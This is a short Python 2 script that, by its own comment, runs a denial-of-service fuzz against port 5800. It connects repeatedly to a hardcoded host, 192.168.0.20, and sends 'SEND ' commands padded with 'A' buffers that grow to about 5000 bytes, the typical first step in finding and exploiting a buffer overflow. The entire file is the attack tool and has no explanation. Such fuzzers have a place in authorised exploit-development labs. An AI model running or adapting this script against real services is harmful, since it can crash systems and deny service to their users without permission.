#!/usr/bin/python
#Run DOS on port 5800 with A's

import socket

list=["A"]
cont=100

while len(list) <= 50:
        list.append("A"*cont)
        cont = cont + 100
for data in list:
        print "Fuzzing with SEND %s bytes"%len(data)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.0.20",5800))
        s.recv(1024)
        s.send("SEND "+data+"\r\n")